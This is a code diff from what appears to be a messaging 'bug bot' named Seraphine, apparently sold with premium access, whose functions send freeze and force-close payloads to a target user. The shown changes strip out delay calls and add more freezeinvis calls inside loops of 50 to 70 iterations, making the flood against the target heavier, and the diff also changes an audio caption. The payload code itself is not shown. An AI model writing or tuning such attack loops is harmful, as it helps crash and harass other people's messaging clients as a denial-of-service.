@@ -3949,7 +3949,6 @@ await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
 await freezeinvis(target)
-await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 }
@@ -3958,11 +3957,15 @@ console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 async function crayxsuper(target) {
 for (let i = 0; i < 70; i++) {
 await freezeinvis(target)
-await freespamdelay(target)
 await freezeinvis(target)
-await freespamdelay(target)
 await freezeinvis(target)
-await freespamdelay(target)
+await freezeinvis(target)
+await freezeinvis(target)
+await freezeinvis(target)
+await freezeinvis(target)
+await freezeinvis(target)
+await freezeinvis(target)
+await freezeinvis(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 }
@@ -3977,14 +3980,12 @@ await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
 await freezeinvis(target)
-await freespamdelay(target)
 await ForcloseDOC(target)
 await freezeinvis(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
 await freezeinvis(target)
-await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
@@ -3993,13 +3994,13 @@ console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 async function Crayxbayar(target) {
 for (let i = 0; i < 50; i++) {
 await freezeinvis(target)
-await freespamdelay(target)
 await freezeinvis(target)
-await freespamdelay(target)
 await freezeinvis(target)
-await freespamdelay(target)
 await freezeinvis(target)
-await freespamdelay(target)
+await freezeinvis(target)
+await freezeinvis(target)
+await freezeinvis(target)
+await freezeinvis(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - MEMEK ] ${target}`));
 }
@@ -4091,7 +4092,7 @@ grup ini tidak termasuk ke dalam grup premium, silahkan untuk membeli acces kepa
     contentType: "audio/mpeg",
     title: "Seraphine - Execution",
     performer: "DilxzzY2",
-    caption: "Seraphine"
+    caption: "Seraphine - Song"
   }).catch(e => console.log("Audio error:", e.message));
 });
 
